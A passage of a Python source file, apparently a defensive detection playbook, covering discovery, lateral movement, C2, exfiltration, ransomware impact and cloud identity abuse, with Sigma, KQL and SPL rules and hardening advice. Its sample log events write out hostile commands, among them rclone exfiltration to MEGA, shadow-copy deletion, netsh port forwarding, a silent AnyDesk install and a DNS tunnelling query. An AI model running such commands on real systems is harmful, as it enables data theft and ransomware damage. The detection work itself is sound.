# Plays, part C: discovery, lateral movement, command and control, exfiltration and impact, identity and cloud, Linux.

PLAYS_C = [
# ------------------------------------------------------------------ discovery
dict(id='di-ad', sec='disc', t='Active Directory reconnaissance bursts', att=['T1087.002', 'T1482', 'T1069.002'], sev='medium',
  lens="The first minutes on a new host look the same in almost every intrusion: whoami /all, net group \"domain admins\" /domain, nltest /domain_trusts, nltest /dclist, net view, then AdFind or SharpHound to pull the whole directory. "
       "Any one command is normal for IT. Five of them from one user in ten minutes, on a workstation, is not.",
  sig=["Four or more distinct recon commands by one account on one host within 10 minutes",
       "nltest /domain_trusts or /dclist from a workstation; AdFind.exe in any form (often renamed — look for its arguments like -f objectcategory=computer)",
       "An LDAP query burst for all users, groups and computers from a non-admin host (Defender for Identity 'reconnaissance' alerts)"],
  logs="Process creation; Defender for Identity (IdentityQueryEvents); LDAP query logging (1644) on DCs if enabled.",
  q=dict(
    kql=r"""// Recon burst: distinct discovery commands per user and host in 10 minutes
let recon = dynamic(["whoami", "net group", "net localgroup", "net user", "nltest", "dsquery", "adfind", "net view", "systeminfo", "ipconfig /all", "quser", "arp -a", "route print", "Get-ADComputer", "Get-ADUser", "Get-DomainController"]);
DeviceProcessEvents
| where Timestamp > ago(7d)
| where ProcessCommandLine has_any (recon)
| extend cmd = tostring(extract(@"(?i)(whoami|net\s+group|net\s+localgroup|net\s+user|nltest|dsquery|adfind|net\s+view|systeminfo|ipconfig|quser|arp|route|Get-AD\w+|Get-Domain\w+)", 1, ProcessCommandLine))
| summarize kinds = dcount(tolower(cmd)), cmds = make_set(ProcessCommandLine, 15), start = min(Timestamp) by DeviceName, AccountName, bin(Timestamp, 10m)
| where kinds >= 4
| order by kinds desc""",
    sigma=r"""title: Domain trust or domain controller discovery with nltest
status: stable
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\nltest.exe'
    CommandLine|contains:
      - '/domain_trusts'
      - '/dclist'
      - '/all_trusts'
  selection_adfind:
    CommandLine|contains:
      - 'objectcategory=computer'
      - 'trustdmp'
      - '-sc trustdmp'
      - 'domainlist'
  condition: selection or selection_adfind
falsepositives:
  - Domain admins troubleshooting trusts from admin workstations
level: medium
tags:
  - attack.discovery
  - attack.t1482""",
    spl=r"""index=sysmon EventCode=1 (CommandLine="*whoami*" OR CommandLine="*net group*" OR CommandLine="*net localgroup*" OR CommandLine="*nltest*" OR CommandLine="*adfind*" OR CommandLine="*net view*" OR CommandLine="*systeminfo*" OR CommandLine="*quser*")
| bin _time span=10m
| stats dc(Image) as tools values(CommandLine) as cmds by _time host User
| where tools >= 4"""),
  ev=['EventID=1 Image="C:\\Windows\\System32\\nltest.exe" CommandLine="nltest /domain_trusts /all_trusts" User="CORP\\j.okafor"', 'EventID=1 Image="C:\\Windows\\System32\\nltest.exe" CommandLine="nltest /sc_query:CORP"'],
  fp="Helpdesk scripts and login scripts that run whoami or net use; IT staff on admin workstations.",
  fix=["Restrict who can enumerate: remove 'Authenticated Users' read on sensitive OUs where possible; NetCease-style hardening of SAMR enumeration (Network access: Restrict clients allowed to make remote calls to SAM)",
       "Run BloodHound yourself and cut the shortest attack paths to Domain Admin before an attacker maps them",
       "Defender for Identity or LDAP logging on DCs to see directory-wide queries"]),

# ------------------------------------------------------------------ lateral movement
dict(id='lm-psexec', sec='lateral', t='PsExec, admin shares and remote services', att=['T1021.002', 'T1570', 'T1569.002'], sev='high',
  lens="With an admin credential, SMB is the road: copy a binary to ADMIN$ or C$, create a service to run it, delete the service. PsExec, Impacket's psexec/smbexec, and every ransomware deployment script do this. "
       "On a flat network one admin hash reaches every host.",
  sig=["A file written to \\\\host\\ADMIN$ or C$ (5145 with WriteData) followed by a 7045 service install on that host",
       "PSEXESVC.exe or a random-named service binary in C:\\Windows",
       "One account logging on (4624 type 3) to many hosts in minutes — especially from a workstation"],
  logs="Security 5140/5145 (file share auditing), 4624, System 7045; process creation.",
  q=dict(
    kql=r"""// One account, many machines, minutes apart: lateral spread
DeviceLogonEvents
| where Timestamp > ago(7d) and LogonType == "Network" and ActionType == "LogonSuccess"
| where not(AccountName endswith "$")
| summarize targets = dcount(DeviceName), list = make_set(DeviceName, 25) by AccountName, RemoteIP, bin(Timestamp, 15m)
| where targets >= 8
| order by targets desc""",
    sigma=r"""title: PsExec service or binary on the target
status: stable
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\PSEXESVC.exe'
  selection_parent:
    ParentImage|endswith: '\PSEXESVC.exe'
  condition: selection or selection_parent
falsepositives:
  - Administrators using PsExec from known admin hosts
level: medium
tags:
  - attack.lateral-movement
  - attack.t1021.002""",
    spl=r"""index=wineventlog EventCode=5145 Share_Name IN ("\\\\*\\ADMIN$", "\\\\*\\C$") Accesses="*WriteData*"
| table _time host Account_Name Source_Address Share_Name Relative_Target_Name
| join type=inner host [search index=wineventlog source=System EventCode=7045 | table _time host Service_Name ImagePath]"""),
  ev=['EventID=1 Image="C:\\Windows\\PSEXESVC.exe" ParentImage="C:\\Windows\\System32\\services.exe" User="NT AUTHORITY\\SYSTEM"', 'EventID=1 Image="C:\\Windows\\System32\\svchost.exe" ParentImage="C:\\Windows\\System32\\services.exe"'],
  fp="IT using PsExec and remote software deployment; they come from a few known hosts.",
  fix=["Block inbound SMB and RPC between workstations (Windows Firewall GPO); only admin and management hosts reach servers",
       "LAPS (Windows LAPS) so every local admin password is unique; deny network logon for local accounts (KB2871997 policies)",
       "Tiered admin accounts and Protected Users group for admins"]),

dict(id='lm-pth', sec='lateral', t='Pass-the-hash and overpass-the-hash', att=['T1550.002', 'T1550.003'], sev='high',
  lens="A dumped NTLM hash works as a password for NTLM authentication: no cracking needed. Mimikatz sekurlsa::pth starts a process with the stolen credential injected — "
       "which leaves a very particular logon: type 9 (NewCredentials) through the seclogo logon process. Overpass-the-hash turns the hash into a Kerberos ticket the same way.",
  sig=["4624 LogonType 9 with LogonProcessName 'seclogo' and AuthenticationPackage Negotiate (on the source host)",
       "NTLM network logons (4624 type 3, NTLM) from a workstation to many hosts for a privileged account that normally uses Kerberos",
       "4768/4769 with RC4 for an account whose tickets are normally AES (overpass-the-hash)"],
  logs="Security 4624, 4776, 4768/4769; Defender for Identity.",
  q=dict(
    sigma=r"""title: Logon with new credentials through seclogo (pass-the-hash pattern)
status: stable
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4624
    LogonType: 9
    LogonProcessName: 'seclogo'
  condition: selection
falsepositives:
  - runas /netonly used by administrators (same event; check the account and host)
level: high
tags:
  - attack.lateral-movement
  - attack.t1550.002""",
    kql=r"""// Privileged accounts suddenly authenticating with NTLM to many hosts
IdentityLogonEvents
| where Timestamp > ago(7d) and Protocol == "Ntlm" and ActionType == "LogonSuccess"
| summarize hosts = dcount(DestinationDeviceName), list = make_set(DestinationDeviceName, 20) by AccountName, DeviceName, bin(Timestamp, 1h)
| where hosts >= 5
| order by hosts desc""",
    spl=r"""index=wineventlog EventCode=4624 Logon_Type=9 Logon_Process=seclogo
| table _time host Account_Name Network_Account_Name Process_Name"""),
  ev=['EventID=4624 LogonType=9 LogonProcessName="seclogo" AuthenticationPackageName="Negotiate" TargetUserName="j.okafor"', 'EventID=4624 LogonType=3 LogonProcessName="Kerberos" TargetUserName="j.okafor"'],
  fp="runas /netonly by admins — rare and attributable.",
  fix=["Credential Guard; Protected Users group for admins (no NTLM, no RC4, no caching)",
       "Restrict NTLM (audit first, then block) and disable NTLMv1",
       "Local admin passwords unique per host (LAPS) so one hash does not open every machine"]),

dict(id='lm-rmm', sec='lateral', t='Remote-management tools nobody approved', att=['T1219', 'T1133'], sev='high',
  lens="AnyDesk, ScreenConnect, Atera, Splashtop, TeamViewer, RustDesk, NetSupport: signed, trusted, built for remote control, and allowed through most firewalls. "
       "Ransomware affiliates, Scattered Spider and tech-support scammers install them for persistent access that looks like IT. CISA warned about RMM abuse in 2023.",
  sig=["An RMM binary or service on a host where IT does not use that product",
       "Connections to RMM relay domains (*.anydesk.com, *.screenconnect.com, relay.*.splashtop.com, *.atera.com, *.rustdesk.com)",
       "An RMM installed silently from a script, from Temp, or right after a Quick Assist session"],
  logs="Process creation, service installs, DNS and proxy logs.",
  q=dict(
    sigma=r"""title: Remote-management tool started from an unusual place
status: experimental
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith:
      - '\AnyDesk.exe'
      - '\rustdesk.exe'
      - '\ScreenConnect.ClientService.exe'
      - '\AteraAgent.exe'
      - '\SRService.exe'
      - '\TeamViewer.exe'
      - '\client32.exe'
  selection_place:
    Image|contains:
      - '\AppData\'
      - '\Temp\'
      - '\Users\Public\'
      - '\ProgramData\'
      - '\Downloads\'
  condition: selection and selection_place
falsepositives:
  - The RMM your IT department uses (filter by its install path and signer)
level: high
tags:
  - attack.command-and-control
  - attack.t1219""",
    kql=r"""DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl has_any ("anydesk.com", "screenconnect.com", "splashtop.com", "atera.com", "rustdesk.com", "teamviewer.com", "netsupportsoftware.com", "remoteutilities.com", "zoho.com/assist", "level.io")
| summarize devices = dcount(DeviceId), first = min(Timestamp), procs = make_set(InitiatingProcessFileName, 5) by RemoteUrl
| order by devices asc""",
    spl=r"""index=dns (query="*.anydesk.com" OR query="*.screenconnect.com" OR query="*.splashtop.com" OR query="*.atera.com" OR query="*.rustdesk.com" OR query="*.teamviewer.com")
| stats dc(src) as hosts values(src) as srcs min(_time) as first by query
| convert ctime(first)"""),
  ev=['EventID=1 Image="C:\\Users\\j.okafor\\Downloads\\AnyDesk.exe" CommandLine="AnyDesk.exe --install C:\\ProgramData\\AnyDesk --start-with-win --silent"', 'EventID=1 Image="C:\\Program Files\\TeamViewer\\TeamViewer.exe"'],
  fp="Your sanctioned RMM; vendors' support sessions (should be announced and time-bound).",
  fix=["Pick one RMM; block the rest by hash, signer and domain (LOLRMM lists their artefacts)",
       "Application control so users cannot install RMM tools; alert on any RMM service install"]),

dict(id='lm-proxy', sec='lateral', t='Port proxies and tunnels inside the network', att=['T1090.001', 'T1572'], sev='high',
  lens="Living-off-the-land operators turn a compromised host into a relay: netsh interface portproxy forwards a local port to an internal target, SSH (built into Windows now) opens reverse tunnels, "
       "and tools like Chisel, ngrok or FRP carry RDP and SMB over HTTPS. Volt Typhoon used netsh portproxy on compromised hosts.",
  sig=["netsh interface portproxy add v4tov4", "New values under HKLM\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4",
       "ssh.exe with -R or -L on a Windows host; plink with -R", "chisel, frpc, ngrok, cloudflared binaries or their arguments (client, server, --tls-skip-verify, tunnel)"],
  logs="Process creation, registry events, network connections.",
  q=dict(
    sigma=r"""title: Port forwarding set up on a Windows host
status: stable
logsource:
  category: process_creation
  product: windows
detection:
  selection_netsh:
    Image|endswith: '\netsh.exe'
    CommandLine|contains|all:
      - 'interface'
      - 'portproxy'
      - 'add'
  selection_ssh:
    Image|endswith:
      - '\ssh.exe'
      - '\plink.exe'
    CommandLine|contains:
      - ' -R '
      - ' -L '
      - ' -D '
  selection_tools:
    CommandLine|contains:
      - 'chisel client'
      - 'chisel server'
      - 'frpc -c'
      - 'ngrok tcp'
      - 'cloudflared tunnel'
  condition: 1 of selection_*
falsepositives:
  - Admins forwarding ports for testing (should be temporary and documented)
level: high
tags:
  - attack.command-and-control
  - attack.t1090.001""",
    kql=r"""DeviceRegistryEvents
| where Timestamp > ago(90d) and RegistryKey has @"\Services\PortProxy\v4tov4"
| project Timestamp, DeviceName, RegistryValueName, RegistryValueData, InitiatingProcessCommandLine""",
    cli=r"""netsh interface portproxy show all
reg query HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4 /s"""),
  ev=['EventID=1 Image="C:\\Windows\\System32\\netsh.exe" CommandLine="netsh interface portproxy add v4tov4 listenport=9999 listenaddress=0.0.0.0 connectport=3389 connectaddress=10.20.1.5"', 'EventID=1 Image="C:\\Windows\\System32\\netsh.exe" CommandLine="netsh interface ip show config"'],
  fp="IPv6 transition helpers and some hypervisor tooling use portproxy on servers; document them.",
  fix=["Alert on any portproxy registry value; there are few legitimate ones",
       "Block outbound to tunnelling services (ngrok, trycloudflare.com) at the proxy unless approved"]),

# ------------------------------------------------------------------ command and control
dict(id='c2-beacon', sec='c2', t='Beaconing: the regular call home', att=['T1071.001', 'T1573'], sev='high',
  lens="An implant checks in on a timer — every 60 seconds with 20% jitter, every 8 hours, whatever the operator set. Even with jitter, the gaps between connections cluster tightly in a way human browsing never does. "
       "Low variance of intervals, many connections, small and similar byte counts, one rare destination: that is a beacon. RITA and many SIEM analytics are built on this.",
  sig=["Connections from one host to one destination with a low coefficient of variation in the time between them (stdev/mean < 0.2) over hours",
       "Similar request and response sizes every time; long sessions of tiny packets",
       "A destination contacted by very few hosts in your estate (rare) with a young domain or a hosting ASN",
       "JA3/JA4 TLS fingerprints of known C2 frameworks; user agents that do not match the process"],
  logs="Proxy or firewall logs with timestamps per connection; Zeek conn.log; EDR network events.",
  q=dict(
    spl=r"""index=proxy earliest=-24h
| sort 0 src_ip dest_host _time
| streamstats current=f last(_time) as prev by src_ip dest_host
| eval gap=_time-prev
| stats count avg(gap) as mean stdev(gap) as sd avg(bytes_out) as avg_out dc(bytes_out) as sizes by src_ip dest_host
| where count > 30 AND mean > 10
| eval cv=round(sd/mean, 3)
| where cv < 0.2
| lookup domain_age domain as dest_host OUTPUT days_old
| sort cv""",
    kql=r"""// Defender for Endpoint: regular gaps between a process's connections to one destination
DeviceNetworkEvents
| where Timestamp > ago(1d) and RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| summarize times = make_list(Timestamp, 2000), n = count() by DeviceName, InitiatingProcessFileName, RemoteIP, RemoteUrl
| where n > 30
| extend sorted = array_sort_asc(times)
| mv-apply t = sorted to typeof(datetime) on (
    order by t asc | extend gap = datetime_diff('second', t, prev(t)) | where isnotnull(gap) and gap > 0
    | summarize mean = avg(gap), sd = stdev(gap))
| extend cv = round(sd / mean, 3)
| where cv < 0.2 and mean between (10 .. 86400)
| project DeviceName, InitiatingProcessFileName, RemoteIP, RemoteUrl, n, mean, cv
| order by cv asc""",
    cli=r"""# Zeek logs: RITA scores beacons, long connections and DNS tunnelling
rita import --logs /opt/zeek/logs/2026-11-26 --database corp-2026-11-26
rita view corp-2026-11-26     # sort by beacon score; read the top 20"""),
  fp="Update checks, telemetry, NTP, chat clients' keep-alives, monitoring agents. Build an allow-list of destinations, then read what remains.",
  fix=["Force outbound web through a proxy with TLS inspection where lawful; block direct egress from servers",
       "Block newly registered domains (under 30 days) for most users",
       "Use JA4 fingerprints and domain age in the scoring — beacons to rare, young destinations first"]),

dict(id='c2-dns', sec='c2', t='DNS tunnelling and generated domains', att=['T1071.004', 'T1568.002'], sev='medium',
  lens="When only DNS gets out, data goes inside the queries: long, random-looking subdomains of one parent domain, often as TXT or NULL requests (iodine, dnscat2, Cobalt Strike's DNS beacon). "
       "Malware with domain-generation algorithms tries hundreds of random domains a day until one resolves.",
  sig=["Many unique subdomains under one parent domain from one host (hundreds per hour)",
       "Query names with labels over 40 characters, high entropy, or base32/hex alphabets",
       "A host generating many NXDOMAIN responses for random-looking .com/.net/.top domains (DGA)",
       "High TXT query volume to a domain nobody else queries"],
  logs="DNS server logs or Sysmon 22 (DNS query with process); Zeek dns.log; resolver logs.",
  q=dict(
    sigma=r"""title: Very long DNS query label
status: experimental
logsource:
  category: dns_query
  product: windows
detection:
  selection:
    QueryName|re: '^[a-z0-9-]{45,}\.'
  filter_cdn:
    QueryName|endswith:
      - '.akamaiedge.net'
      - '.cloudfront.net'
      - '.amazonaws.com'
  condition: selection and not filter_cdn
falsepositives:
  - CDN and anti-virus lookups that encode hashes in names
level: medium
tags:
  - attack.command-and-control
  - attack.t1071.004""",
    spl=r"""index=dns earliest=-24h
| rex field=query "(?<sub>.+)\.(?<parent>[^.]+\.[^.]+)$"
| eval sublen=len(sub)
| stats dc(sub) as uniq avg(sublen) as avglen count by src parent
| where uniq > 200 AND avglen > 25
| sort - uniq""",
    kql=r"""DnsEvents
| where TimeGenerated > ago(1d) and SubType == "LookupQuery"
| extend parent = strcat(tostring(split(Name, ".")[-2]), ".", tostring(split(Name, ".")[-1])), first = tostring(split(Name, ".")[0])
| summarize uniq = dcount(Name), avglen = avg(strlen(first)), types = make_set(QueryType) by ClientIP, parent
| where uniq > 200 and avglen > 25
| order by uniq desc"""),
  ev=['EventID=22 QueryName="mfzwizlomfzgk3tpnf2gs3tlonuw4ztpmfzhizloobqxe2lm.d.c2-example.net" Image="C:\\Windows\\System32\\rundll32.exe"', 'EventID=22 QueryName="login.microsoftonline.com" Image="C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"'],
  fp="Anti-virus cloud lookups (hash-in-name), CDNs, some telemetry (Microsoft and Google services) — whitelist by parent domain.",
  fix=["Force all DNS through your resolvers; block outbound 53/853 and known DoH endpoints elsewhere",
       "Protective DNS with newly-registered-domain and DGA blocking"]),

dict(id='c2-saas', sec='c2', t='C2 and exfiltration over trusted services: Telegram, Discord, tunnels', att=['T1102.002', 'T1567'], sev='high',
  lens="Infostealers post their loot to a Telegram bot or a Discord webhook; RATs use Telegram as their command channel; operators hide inside ngrok, Cloudflare Tunnel or legitimate cloud storage. "
       "The traffic goes to a trusted domain over HTTPS — but the process making it is wrong.",
  sig=["Connections or DNS lookups for api.telegram.org, discord.com/api/webhooks or cdn.discordapp.com from a process that is not the Telegram or Discord app or a browser",
       "*.ngrok-free.app, *.ngrok.io, *.trycloudflare.com, *.loca.lt or similar tunnel domains from servers or unusual processes",
       "Uploads to file-sharing (transfer.sh, gofile.io, mega.nz, anonfiles clones) right after archive creation"],
  logs="DNS with process (Sysmon 22), proxy logs with process (EDR network events).",
  q=dict(
    sigma=r"""title: Telegram or Discord API used by a process that is not a browser or the official app
status: experimental
logsource:
  category: dns_query
  product: windows
detection:
  selection:
    QueryName:
      - 'api.telegram.org'
      - 'discord.com'
      - 'discordapp.com'
      - 'cdn.discordapp.com'
  filter_apps:
    Image|endswith:
      - '\chrome.exe'
      - '\msedge.exe'
      - '\firefox.exe'
      - '\brave.exe'
      - '\Telegram.exe'
      - '\Discord.exe'
  condition: selection and not filter_apps
falsepositives:
  - Monitoring scripts that post alerts to Telegram or Discord (name them)
level: high
tags:
  - attack.exfiltration
  - attack.t1567""",
    kql=r"""DeviceNetworkEvents
| where Timestamp > ago(14d)
| where RemoteUrl has_any ("api.telegram.org", "discord.com/api/webhooks", "ngrok-free.app", "ngrok.io", "trycloudflare.com", "loca.lt", "gofile.io", "transfer.sh")
| where InitiatingProcessFileName !in~ ("chrome.exe", "msedge.exe", "firefox.exe", "brave.exe", "telegram.exe", "discord.exe")
| summarize n = count(), urls = make_set(RemoteUrl, 10) by DeviceName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessSHA256"""),
  ev=['EventID=22 QueryName="api.telegram.org" Image="C:\\Users\\j.okafor\\AppData\\Local\\Temp\\svc_update.exe"', 'EventID=22 QueryName="api.telegram.org" Image="C:\\Users\\j.okafor\\AppData\\Roaming\\Telegram Desktop\\Telegram.exe"'],
  fp="Your own chat-ops bots; developers testing webhooks.",
  fix=["Block Telegram, Discord and tunnel domains for servers outright; for users, allow only the official apps and browsers",
       "When you find a bot token in malware, report it to Telegram — do not call the API with it yourself (it alerts the operator and may be unlawful)"]),

# ------------------------------------------------------------------ exfiltration and impact
dict(id='ex-rclone', sec='impact', t='Data theft with rclone, MEGA and archives', att=['T1567.002', 'T1560.001', 'T1048'], sev='critical',
  lens="Double-extortion ransomware steals before it encrypts. The toolkit is boring: 7-Zip or WinRAR with a password to stage, then rclone (often renamed to svchost.exe) to copy to MEGA, an S3 bucket or an SFTP server, "
       "or a purpose-built tool like ExMatter. Days or hours of large outbound transfers precede the ransom note.",
  sig=["rclone arguments in any process: copy/sync with --config, --transfers, mega:, s3:, sftp:, --no-check-certificate, --ignore-existing",
       "rar a -hp / 7z a -p on file servers; archives named by department or year in Temp or ProgramData",
       "A host uploading gigabytes to an ASN it never talked to, especially out of hours"],
  logs="Process creation; firewall/proxy byte counts; file creation of large archives.",
  q=dict(
    sigma=r"""title: rclone-style copy to cloud storage, or password-protected archive staging
status: stable
logsource:
  category: process_creation
  product: windows
detection:
  selection_rclone_cmd:
    CommandLine|contains:
      - ' copy '
      - ' sync '
  selection_rclone_args:
    CommandLine|contains:
      - 'mega:'
      - '--config'
      - '--transfers'
      - '--no-check-certificate'
      - 'sftp:'
      - 'ftp:'
  selection_rclone_name:
    Description: 'Rsync for cloud storage'
  selection_archive:
    CommandLine|contains:
      - ' a -hp'
      - ' a -p'
      - ' a -mhe=on -p'
  condition: (selection_rclone_cmd and selection_rclone_args) or selection_rclone_name or selection_archive
falsepositives:
  - Backup jobs using rclone (from a service account and known destination)
level: high
tags:
  - attack.exfiltration
  - attack.t1567.002""",
    kql=r"""// Big uploads to destinations the host never used before
let base = DeviceNetworkEvents | where Timestamp between (ago(30d) .. ago(1d)) | summarize by DeviceId, RemoteIP;
DeviceNetworkEvents
| where Timestamp > ago(1d) and RemoteIPType == "Public"
| join kind=leftanti base on DeviceId, RemoteIP
| summarize conns = count(), procs = make_set(InitiatingProcessFileName, 5) by DeviceName, RemoteIP, RemoteUrl
| join kind=inner (DeviceNetworkInfo | summarize by DeviceName) on DeviceName
| order by conns desc
// pair with firewall byte counts: Defender network events do not carry bytes""",
    spl=r"""index=firewall action=allowed earliest=-24h dest_ip!=10.0.0.0/8 dest_ip!=172.16.0.0/12 dest_ip!=192.168.0.0/16
| stats sum(bytes_out) as out by src_ip dest_ip dest_port
| where out > 1073741824
| eval GB=round(out/1073741824, 2)
| sort - GB"""),
  ev=['EventID=1 Image="C:\\ProgramData\\svchost.exe" CommandLine="svchost.exe copy \\\\FS01\\Finance mega:backup --transfers 16 --config C:\\ProgramData\\rc.conf --no-check-certificate" Description="Rsync for cloud storage"', 'EventID=1 Image="C:\\Windows\\System32\\robocopy.exe" CommandLine="robocopy \\\\FS01\\Finance D:\\Backup /MIR"'],
  fp="Sanctioned rclone backups; developers syncing to cloud storage.",
  fix=["Block MEGA and unsanctioned cloud storage at the proxy; egress allow-lists for servers",
       "Alert on archive tools with passwords on file servers, and on any binary whose PE description is 'Rsync for cloud storage'",
       "Volume-based alerting on outbound bytes per host per hour"]),

dict(id='im-ransom', sec='impact', t='Ransomware\u2019s last mile: shadow copies, backups, recovery', att=['T1490', 'T1486'], sev='critical',
  lens="Minutes before encryption, recovery options are removed: shadow copies deleted, Windows recovery disabled, backup catalogues wiped, backup consoles logged into with stolen admin credentials. "
       "These commands are the last reliable warning — if you see them, isolate now, then investigate.",
  sig=["vssadmin delete shadows /all /quiet; wmic shadowcopy delete; Get-WmiObject Win32_ShadowCopy | Remove-WmiObject",
       "bcdedit /set {default} recoveryenabled no; bcdedit /set {default} bootstatuspolicy ignoreallfailures",
       "wbadmin delete catalog / systemstatebackup; backup service stopped; mass file renames with one new extension",
       "GPO or PsExec pushing the same binary to every host at once"],
  logs="Process creation; file events; backup application logs.",
  q=dict(
    sigma=r"""title: Shadow copies, backups or recovery removed
status: stable
logsource:
  category: process_creation
  product: windows
detection:
  selection_vss:
    CommandLine|contains:
      - 'delete shadows'
      - 'shadowcopy delete'
      - 'resize shadowstorage'
      - 'Win32_ShadowCopy'
  selection_bcd:
    Image|endswith: '\bcdedit.exe'
    CommandLine|contains:
      - 'recoveryenabled no'
      - 'ignoreallfailures'
  selection_wbadmin:
    Image|endswith: '\wbadmin.exe'
    CommandLine|contains:
      - 'delete catalog'
      - 'delete systemstatebackup'
      - 'delete backup'
  condition: 1 of selection_*
falsepositives:
  - Very rare; some disk-cleanup scripts resize shadow storage
level: critical
tags:
  - attack.impact
  - attack.t1490""",
    kql=r"""DeviceFileEvents
| where Timestamp > ago(1h) and ActionType == "FileRenamed"
| extend ext = tostring(split(FileName, ".")[-1])
| summarize renames = count(), exts = dcount(ext), ext1 = any(ext) by DeviceName, InitiatingProcessFileName, bin(Timestamp, 5m)
| where renames > 200 and exts <= 2
| order by renames desc""",
    spl=r"""index=sysmon EventCode=1 (CommandLine="*delete shadows*" OR CommandLine="*shadowcopy delete*" OR CommandLine="*recoveryenabled no*" OR CommandLine="*delete catalog*")
| table _time host User ParentImage CommandLine"""),
  ev=['EventID=1 Image="C:\\Windows\\System32\\vssadmin.exe" CommandLine="vssadmin.exe delete shadows /all /quiet" ParentImage="C:\\Windows\\System32\\cmd.exe"', 'EventID=1 Image="C:\\Windows\\System32\\vssadmin.exe" CommandLine="vssadmin list shadows"'],
  fp="Almost none outside planned maintenance.",
  fix=["Automatic host isolation on these commands (EDR custom detection with response action)",
       "Immutable, offline or separately-credentialed backups; MFA on the backup console; test restores",
       "Practise the decision: who can isolate the whole network at 3 a.m., and how"]),

# ------------------------------------------------------------------ identity and cloud
dict(id='cl-inbox', sec='cloud', t='Mailbox rules that hide and forward (BEC)', att=['T1564.008', 'T1114.003'], sev='high',
  lens="After taking over a mailbox, the first move in business email compromise is a rule: move replies about invoices to RSS Feeds or Conversation History, mark them read, or forward everything outside. "
       "The real owner never sees the conversation in which the bank details change.",
  sig=["New-InboxRule or Set-InboxRule with ForwardTo, RedirectTo, ForwardAsAttachmentTo, DeleteMessage, or MoveToFolder RSS Feeds / Archive / Conversation History",
       "Rule names of one or two characters ('.', '..', ',') or keywords like invoice, payment, wire, bank",
       "Created from an IP or country the user never signs in from, minutes after a risky sign-in"],
  logs="Unified audit log (OfficeActivity / CloudAppEvents); Exchange Online mailbox audit.",
  q=dict(
    kql=r"""OfficeActivity
| where TimeGenerated > ago(30d) and Operation in ("New-InboxRule", "Set-InboxRule", "UpdateInboxRules")
| extend p = tostring(Parameters)
| where p has_any ("ForwardTo", "RedirectTo", "ForwardAsAttachmentTo", "DeleteMessage", "RSS Feeds", "Conversation History", "MarkAsRead")
     or p matches regex @'"Name","Value":"[^a-zA-Z0-9]{1,3}"'
| project TimeGenerated, UserId, ClientIP, Operation, p
| order by TimeGenerated desc""",
    spl=r"""index=o365 sourcetype="o365:management:activity" Operation IN ("New-InboxRule", "Set-InboxRule")
| spath input=Parameters
| search Parameters{}.Name IN (ForwardTo, RedirectTo, DeleteMessage, MoveToFolder)
| table _time UserId ClientIP Parameters{}.Name Parameters{}.Value""",
    sigma=r"""title: Inbox rule that forwards, deletes or hides mail
status: experimental
logsource:
  product: m365
  service: exchange
detection:
  selection_op:
    Operation:
      - 'New-InboxRule'
      - 'Set-InboxRule'
  selection_what:
    Parameters|contains:
      - 'ForwardTo'
      - 'RedirectTo'
      - 'DeleteMessage'
      - 'RSS Feeds'
      - 'Conversation History'
  condition: selection_op and selection_what
falsepositives:
  - Users forwarding to their own other address (policy decides)
level: high
tags:
  - attack.collection
  - attack.t1114.003"""),
  ev=['Operation=New-InboxRule UserId="ap@corp.example" ClientIP="185.220.101.4" Parameters="Name=.. MoveToFolder=RSS Feeds MarkAsRead=True SubjectOrBodyContainsWords=invoice"', 'Operation=New-InboxRule UserId="ap@corp.example" Parameters="Name=Newsletters MoveToFolder=Newsletters"'],
  fp="Users organising newsletters into folders.",
  fix=["Block automatic external forwarding in the outbound spam policy",
       "Alert on rules created from risky sessions; on a case, check rules, forwarding (ForwardingSmtpAddress), delegates and OAuth apps together"]),

dict(id='cl-spcred', sec='cloud', t='New secrets on apps and service principals', att=['T1098.001', 'T1550.001'], sev='critical',
  lens="An app registration or service principal with strong permissions is a back door that survives password resets and MFA: add a new client secret or certificate and sign in as the app. "
       "This was central to both the SolarWinds-era intrusions (2020) and Midnight Blizzard's 2024 Microsoft breach, where a legacy test OAuth app was used to grant access to corporate mailboxes.",
  sig=["'Add service principal credentials' or 'Update application – Certificates and secrets management' by a user, especially outside change windows",
       "New app role assignment to Microsoft Graph or Exchange (full_access_as_app, Mail.ReadWrite, Directory.ReadWrite.All)",
       "Service principal sign-ins (AADServicePrincipalSignInLogs) from new IPs right after a credential was added"],
  logs="Entra AuditLogs; AADServicePrincipalSignInLogs; MicrosoftGraphActivityLogs.",
  q=dict(
    kql=r"""AuditLogs
| where TimeGenerated > ago(30d)
| where OperationName in ("Add service principal credentials", "Update application – Certificates and secrets management", "Add app role assignment to service principal", "Add delegated permission grant", "Add owner to application")
| extend target = tostring(TargetResources[0].displayName), by = coalesce(tostring(InitiatedBy.user.userPrincipalName), tostring(InitiatedBy.app.displayName)), ip = tostring(InitiatedBy.user.ipAddress)
| extend detail = tostring(TargetResources[0].modifiedProperties)
| project TimeGenerated, OperationName, target, by, ip, detail
| order by TimeGenerated desc""",
    cli=r"""# Apps with application permissions to mail or the directory — the ones worth an attacker's time
Connect-MgGraph -Scopes "Application.Read.All"
$graph = Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'"
Get-MgServicePrincipalAppRoleAssignedTo -ServicePrincipalId $graph.Id -All |
  ForEach-Object { [pscustomobject]@{App=$_.PrincipalDisplayName; Role=($graph.AppRoles | ? Id -eq $_.AppRoleId).Value} } |
  Where-Object Role -match 'Mail|Directory|Files|Sites|RoleManagement' | Sort App"""),
  fp="DevOps pipelines rotating secrets on schedule (from known automation identities).",
  fix=["Inventory apps with application permissions; remove unused ones and unused credentials",
       "Restrict who can add credentials (application owners are often forgotten users) and alert on every addition to high-privilege apps",
       "Prefer certificates and managed identities; set short secret lifetimes"]),

dict(id='cl-fed', sec='cloud', t='Federation trust and Golden SAML', att=['T1484.002', 'T1606.002'], sev='critical',
  lens="Whoever holds the token-signing key of a federation server (AD FS) or controls a federated domain can mint sign-in tokens for anyone, with any claims — MFA included. "
